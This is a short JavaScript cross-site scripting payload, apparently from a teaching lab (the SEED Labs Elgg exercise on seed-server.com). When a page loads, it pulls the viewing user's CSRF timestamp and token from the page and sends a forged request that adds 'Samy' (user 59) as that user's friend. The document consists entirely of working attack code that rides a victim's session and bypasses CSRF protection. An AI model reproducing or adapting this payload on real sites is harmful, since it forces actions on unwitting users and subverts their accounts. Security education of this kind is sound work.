<script type="text/javascript">
window.onload = function(){
  var Ajax = null;

  //Set the timestamp and secret token parameters
  var ts="&__elgg_ts="+ elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  //Construct the HTTP request to add Samy as a friend
  var sendurl = "http://www.seed-server.com/action/friends/add"
                 + "?friend=59" + ts + token; //add token and ts in the right order here;

  //Create and send Ajax request to add friends
  Ajax = new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
</script>

